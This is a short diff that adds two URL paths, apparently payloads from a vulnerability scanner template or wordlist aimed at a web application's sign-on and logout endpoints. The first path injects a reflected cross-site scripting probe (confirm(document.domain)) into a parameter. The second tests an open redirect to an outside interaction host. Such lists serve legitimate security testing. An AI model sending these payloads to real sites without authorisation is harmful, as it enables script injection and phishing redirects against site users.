@@ -1,0 +1,2 @@
+/security/hostSignon.do?hostSignOn=true&servProvCode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9
+/ssoAdapter/logoutAction.do?servProvCode=SAFVC&successURL=https://interact.sh/
